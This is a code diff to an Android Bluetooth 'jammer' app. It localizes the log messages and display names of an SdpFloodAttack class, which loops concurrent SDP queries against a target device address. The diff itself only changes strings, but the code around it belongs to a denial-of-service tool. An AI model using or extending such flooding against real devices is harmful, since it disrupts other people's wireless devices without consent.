@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.bluetooth.BluetoothManager
 import android.content.Context
 import androidx.core.content.ContextCompat.getSystemService
+import com.eikarna.bluetoothjammer.R
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -22,8 +23,11 @@ class SdpFloodAttack(
     private val rateDelayMs: Int = 0
 ) : BluetoothAttack {
 
-    override val displayName = AttackType.SDP_FLOOD.displayName
-    override val description = AttackType.SDP_FLOOD.description
+    private var appContext: Context? = null
+    override val displayName: String
+        get() = appContext?.getString(AttackType.SDP_FLOOD.labelRes) ?: AttackType.SDP_FLOOD.fallbackLabel
+    override val description: String
+        get() = appContext?.getString(AttackType.SDP_FLOOD.descRes) ?: AttackType.SDP_FLOOD.fallbackDesc
 
     private var scope: CoroutineScope? = null
     @Volatile
@@ -35,6 +39,7 @@ class SdpFloodAttack(
     override fun start(context: Context, onLog: (String) -> Unit) {
         if (running) return
         running = true
+        appContext = context.applicationContext
         val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
         if (adapter == null) {
             running = false
@@ -49,7 +54,7 @@ class SdpFloodAttack(
 
         val concurrency = threads.coerceIn(1, 16)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("[SDP] Query Storm iniciado (objetivo $targetAddress, concurrencia $concurrency)")
+        onLog("[SDP] " + context.getString(R.string.log_sdp_started, targetAddress, concurrency))
         scope!!.launch {
             var total = 0
             while (isActive && running) {
@@ -60,10 +65,10 @@ class SdpFloodAttack(
                     }
                 }
                 jobs.forEach { it.join() }
-                if (total % 50 == 0) onLog("[SDP] Consultas SDP enviadas: $total")
+                if (total % 50 == 0) onLog("[SDP] " + context.getString(R.string.log_sdp_sent, total))
                 jitterDelay(maxOf(200, rateDelayMs))
             }
-            onLog("[SDP] Query Storm detenido ($total consultas enviadas)")
+            onLog("[SDP] " + context.getString(R.string.log_sdp_stopped, total))
         }
     }
 
